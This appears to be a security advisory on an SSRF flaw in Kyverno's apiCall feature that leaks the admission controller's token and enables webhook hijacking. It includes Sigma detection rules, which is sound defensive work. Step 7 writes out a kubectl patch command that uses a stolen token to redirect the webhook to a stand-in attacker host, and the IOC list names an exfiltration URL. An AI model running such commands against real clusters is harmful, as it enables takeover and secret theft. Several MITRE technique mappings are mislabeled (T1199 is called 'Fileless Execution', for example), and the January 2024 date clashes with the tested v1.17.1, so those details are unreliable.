---
title: Kyverno apiCall SSRF Leads to Cluster Takeover
slug: 2024-01-kyverno-ssrf
description: A Server Side Request Forgery (SSRF) vulnerability in Kyverno's apiCall feature allows an attacker to exfiltrate the admission controller's ServiceAccount token by creating a ClusterPolicy with a malicious service URL, which can then be used to hijack webhooks, intercept and modify API requests, and potentially access cloud IAM credentials on cloud-hosted clusters, leading to full cluster compromise.
date: "2024-01-03T12:00:00Z"
type: advisory
types:
  - advisory
severities:
  - critical
tags:
  - kyverno
  - ssrf
  - kubernetes
  - credential-access
  - webhook
vendors:
  - Kyverno
products:
  - Kyverno
mitre_ttps:
  - tactic_id: TA0001
    tactic_name: Initial Access
    technique_id: T1133
    technique_name: External Remote Services
  - tactic_id: TA0003
    tactic_name: Persistence
    technique_id: T1190
    technique_name: Exploit Public-Facing Application
  - tactic_id: TA0004
    tactic_name: Privilege Escalation
    technique_id: T1555
    technique_name: Credentials from Password Stores
  - tactic_id: TA0005
    tactic_name: Defense Evasion
    technique_id: T1190
    technique_name: Exploit Public-Facing Application
  - tactic_id: TA0005
    tactic_name: Defense Evasion
    technique_id: T1505
    technique_name: Server Software Component
  - tactic_id: TA0005
    tactic_name: Defense Evasion
    technique_id: T1199
    technique_name: Fileless Execution
  - tactic_id: TA0006
    tactic_name: Credential Access
    technique_id: T1555
    technique_name: Credentials from Password Stores
references:
  - https://github.com/advisories/GHSA-f9g8-6ppc-pqq4
iocs:
  - type: ip
    value: 169.254.169.254
  - type: url
    value: http://ATTACKER-IP:9999/steal
  - type: url
    value: https://ATTACKER:443/mutate
ioc_counts:
  ip: 1
  url: 2
rules:
  - title: Detect Webhook Hijacking
    description: Detects suspicious attempts to patch MutatingWebhookConfiguration or ValidatingWebhookConfiguration, potentially indicating webhook hijacking.
    platform: sigma
    severity: critical
    tactics:
      - persistence
      - privilege_escalation
    techniques:
      - T1190
      - T1555
    data_sources:
      - auditd
      - kubernetes
  - title: Detect Kyverno apiCall to External Domains
    description: Detects ClusterPolicy resources that use the apiCall feature to connect to external domains, potentially indicating SSRF attempts.
    platform: sigma
    severity: high
    tactics:
      - credential_access
      - initial_access
    techniques:
      - T1133
      - T1555.003
    data_sources:
      - auditd
      - kubernetes
rules_count: 2
---

Kyverno, a Kubernetes policy engine, contains a critical vulnerability in its `apiCall` feature. This feature, designed to enrich policy evaluation with external data, automatically attaches the admission controller's ServiceAccount token to outgoing HTTP requests. The vulnerability stems from a lack of validation of the service URL used in the `apiCall` specification within a `ClusterPolicy`. This allows an attacker to specify an arbitrary URL, including attacker-controlled servers. When Kyverno evaluates a policy using the `apiCall` feature, the admission controller's ServiceAccount token is sent to the attacker's server. The default Helm installation grants the admission controller (`kyverno-admission-controller`) the ability to PATCH both `MutatingWebhookConfiguration` and `ValidatingWebhookConfiguration` resources. This allows an attacker to use the stolen token to hijack webhooks and intercept all API requests, potentially leading to full cluster compromise and credential theft. This vulnerability was tested on Kyverno v1.17.1, but likely affects all versions with `apiCall` support.

## Attack Chain

1. An attacker gains the ability to create or modify `ClusterPolicy` resources within the Kubernetes cluster, potentially through compromising a service account with sufficient RBAC permissions.
2. The attacker crafts a malicious `ClusterPolicy` that leverages the `apiCall` feature.  The `service.url` within the `apiCall` specification points to an attacker-controlled server.
3. A Kubernetes resource (e.g., a Pod) is created or modified, triggering the policy evaluation by Kyverno.
4. Kyverno's admission controller, while evaluating the policy, makes an HTTP request to the attacker-controlled server, automatically attaching its ServiceAccount token in the `Authorization` header.
5. The attacker captures the ServiceAccount token from the HTTP request logs on their server.
6. The attacker uses the stolen token to authenticate to the Kubernetes API server.
7. The attacker patches the `MutatingWebhookConfiguration` and/or `ValidatingWebhookConfiguration` resources, redirecting webhook traffic to an attacker-controlled endpoint. `kubectl patch mutatingwebhookconfiguration kyverno-policy-mutating-webhook-cfg --type='json' -p='[{"op":"replace","path":"/webhooks/0/clientConfig/url","value":"https://ATTACKER:443/mutate"}]' --token="eyJhbG..."`
8. All subsequent API requests that trigger the hijacked webhooks are now routed to the attacker's server, allowing them to intercept and modify API requests, inject malicious containers, escalate privileges, and exfiltrate secrets.

## Impact

Successful exploitation of this vulnerability allows an attacker to completely compromise the Kubernetes cluster. An attacker can hijack Kyverno's webhooks to intercept and modify all API requests, inject malicious containers into pods, escalate privileges within the cluster, and exfiltrate sensitive data. The attacker can also steal cloud IAM credentials if the token is sent to internal endpoints like `http://169.254.169.254/latest/meta-data/` on cloud-hosted clusters (EKS, GKE, AKS). The impact is significant, as it allows for persistent control over the cluster, potentially leading to data breaches, service disruptions, and other severe consequences.

## Recommendation

*   Monitor Kubernetes audit logs for suspicious `PATCH` requests targeting `MutatingWebhookConfiguration` or `ValidatingWebhookConfiguration` resources, especially those originating from the `kyverno-admission-controller` service account (see Sigma rule: "Detect Webhook Hijacking").
*   Deploy the Sigma rule "Detect Kyverno apiCall to External Domains" to identify potentially malicious `ClusterPolicy` resources that use the `apiCall` feature to connect to external domains.
*   Block outgoing connections to the IPs and URLs listed in the IOC table at your network perimeter to prevent token exfiltration.
*   Upgrade Kyverno to a patched version that addresses this vulnerability as soon as a fix is released.
